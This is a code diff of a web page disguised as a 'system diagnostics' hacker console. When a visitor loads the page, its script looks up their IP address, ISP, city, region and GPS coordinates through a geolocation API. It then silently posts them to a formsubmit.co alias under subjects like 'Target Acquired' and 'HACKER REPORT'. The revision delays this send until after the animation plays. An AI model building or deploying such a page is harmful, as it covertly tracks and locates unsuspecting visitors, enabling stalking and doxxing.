@@ -1,37 +1,9 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>SYSTEM_DIAGNOSTICS</title>
-    <style>
-        body, html { margin: 0; padding: 0; background: black; overflow: hidden; font-family: 'Courier New', monospace; }
-        canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.3; }
-        .console {
-            position: relative; z-index: 2; color: #00ff00;
-            padding: 30px; background: rgba(0, 0, 0, 0.85);
-            border: 1px solid #00ff00; margin: 50px auto;
-            max-width: 700px; box-shadow: 0 0 20px #00ff00;
-            height: 450px; overflow-y: hidden;
-            text-shadow: 0 0 5px #00ff00;
-        }
-        .line { margin-bottom: 4px; white-space: pre-wrap; font-size: 14px; }
-        .blue { color: #00ccff; text-shadow: 0 0 5px #00ccff; }
-        .red { color: #ff3333; text-shadow: 0 0 5px #ff3333; }
-    </style>
-</head>
-<body>
-
-<canvas id="matrix"></canvas>
-
-<div class="console" id="console">
-    <div class="line">> [SYSTEM] BOOTING_CORE_FRMWK...</div>
-</div>
-
 <script>
-    // --- 1. THE MATRIX BACKGROUND ---
+    // --- MATRIX BACKGROUND ---
     const canvas = document.getElementById('matrix');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const letters = "0101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const letters = "0123456789ABCDEF";
     const fontSize = 16;
     const columns = canvas.width / fontSize;
     const drops = Array(Math.floor(columns)).fill(1);
@@ -47,7 +19,7 @@
     }
     setInterval(draw, 35);
 
-    // --- 2. THE FAST CONSOLE SCRIPT ---
+    // --- CONSOLE HANDLER ---
     const consoleBox = document.getElementById('console');
     function addLine(text, type = "") {
         const div = document.createElement('div');
@@ -57,49 +29,43 @@
         consoleBox.scrollTop = consoleBox.scrollHeight;
     }
 
-    // --- 3. THE "PULL" & EMAIL LOGIC ---
+    // --- THE DELAYED PULL LOGIC ---
     fetch('https://ipapi.co/json/')
     .then(res => res.json())
     .then(data => {
-        const hackerLines = [
-            "ESTABLISHING_ENCRYPTED_LINK...",
-            "BYPASSING_ISP_GATEWAY...",
-            "INJECTING_PACKET_SNIFFER...",
-            `NETWORK_FOUND: ${data.org}`,
-            `GEO_LOCK: ${data.latitude}, ${data.longitude}`,
-            `TARGET_CITY: ${data.city}`,
-            "EXTRACTING_BROWSER_METADATA...",
-            "LOGGING_SESSION_TO_REMOTE_DB...",
-            "SUCCESS: TARGET_DETAILS_UPLOADED.",
-            "SHUTTING_DOWN_TRACE..."
+        // These lines appear one-by-one
+        const sequence = [
+            { t: "ESTABLISHING_HANDSHAKE...", s: 500 },
+            { t: "LOCALIZING_NODE_ORIGIN...", s: 1000 },
+            { t: `IP_ADDRESS_FOUND: ${data.ip}`, s: 1500, c: "blue" },
+            { t: "DECRYPTING_ISP_CARRIER...", s: 2200 },
+            { t: `CARRIER: ${data.org}`, s: 2800, c: "blue" },
+            { t: "TRIANGULATING_GPS_COORDINATES...", s: 3500 },
+            { t: `LAT/LONG: ${data.latitude}, ${data.longitude}`, s: 4200, c: "blue" },
+            { t: `SUBURB_IDENTIFIED: ${data.city}`, s: 4800, c: "blue" },
+            { t: "UPLOADING_LOGS_TO_CLOUD_DATABASE...", s: 5500 },
+            { t: "SCAN_COMPLETE. SESSION_ENCRYPTED.", s: 6200, c: "yellow" }
         ];
 
-        let i = 0;
-        const speed = 150; // Super fast script speed
-        const interval = setInterval(() => {
-            if (i < hackerLines.length) {
-                addLine(hackerLines[i], i > 2 && i < 7 ? "blue" : "");
-                i++;
-            } else {
-                clearInterval(interval);
-            }
-        }, speed);
-
-        // SEND TO YOUR HIDDEN ALIAS (jabuvo)
-        // Note: Using the /ajax/ version of your alias
-        fetch("https://formsubmit.co/ajax/jabuvo", {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-            body: JSON.stringify({
-                _subject: "🎯 Target Acquired: " + data.ip,
-                IP_Address: data.ip,
-                ISP: data.org,
-                Location: `${data.city}, ${data.region}`,
-                GPS: `${data.latitude}, ${data.longitude}`,
-                Map: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
-            })
+        sequence.forEach(item => {
+            setTimeout(() => {
+                addLine(item.t, item.c || "");
+            }, item.s);
         });
+
+        // 4. Send the data to your email after 6 seconds
+        setTimeout(() => {
+            fetch("https://formsubmit.co/ajax/jabuvo", {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify({
+                    _subject: "🎯 HACKER REPORT: " + data.ip,
+                    Target_IP: data.ip,
+                    ISP: data.org,
+                    Location: `${data.city}, ${data.region}`,
+                    GPS: `${data.latitude}, ${data.longitude}`
+                })
+            });
+        }, 6500);
     });
 </script>
-</body>
-</html>
